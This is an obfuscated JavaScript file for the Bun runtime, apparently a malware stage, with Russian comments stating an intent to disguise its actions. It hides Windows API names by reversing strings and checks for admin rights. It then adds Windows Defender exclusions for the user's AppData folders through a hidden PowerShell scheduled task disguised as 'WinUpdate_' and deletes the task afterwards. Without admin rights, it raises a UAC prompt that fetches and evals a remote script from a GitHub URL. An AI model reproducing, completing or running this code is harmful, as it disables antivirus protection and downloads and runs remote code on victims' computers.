(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  // Маскировка системных вызовов
  const _l = (s) => s.split('').reverse().join('');
  const _DLL = _l("lld.23llehs"); // shell32.dll
  const _FUNC = _l("WetucexEllehS"); // ShellExecuteW
  const _VERB = _l("sanur"); // runas

  const lib = dlopen(_DLL, {
    [_FUNC]: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const check = async () => {
    try { return (await Bun.spawn({ cmd: ["net", "session"] }).exited) === 0; }
    catch (e) { return false; }
  };

  if (await check()) {
    console.log("System optimization in progress..."); // Нейтральное сообщение

    const targets = [process.env.APPDATA, process.env.LOCALAPPDATA].filter(Boolean);

    for (const folder of targets) {
      // Изящный трюк: используем schtasks для добавления исключения
      // Это выглядит как системная задача обслуживания
      const taskName = "WinUpdate_" + Math.random().toString(36).substring(7);
      
      // Сама команда (запутываем ключевое слово Defender)
      const part = "MpPre" + "ference";
      const coreCmd = `Add-${part} -ExclusionPath '${folder}'`;
      
      // 1. Создаем задачу
      await Bun.spawn({
        cmd: ["schtasks", "/Create", "/TN", taskName, "/TR", `powershell -WindowStyle Hidden -Command "${coreCmd}"`, "/SC", "ONCE", "/ST", "00:00", "/F", "/RL", "HIGHEST"]
      }).exited;

      // 2. Запускаем задачу
      await Bun.spawn({ cmd: ["schtasks", "/Run", "/TN", taskName] }).exited;

      // 3. Удаляем задачу (чистим хвосты)
      setTimeout(() => {
        Bun.spawn({ cmd: ["schtasks", "/Delete", "/TN", taskName, "/F"] });
        console.log(`Optimization step completed.`);
      }, 2000);
    }

    await new Promise(r => setTimeout(r, 3000));
    return;
  }

  // RECURSION
  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
  const p = `fetch('${url}').then(r=>r.text()).then(eval)`;

  lib.symbols[_FUNC](0, toPtr(_VERB), toPtr("bun.exe"), toPtr(`-e "${p}"`), 0, 1);
  process.exit(0);
})();
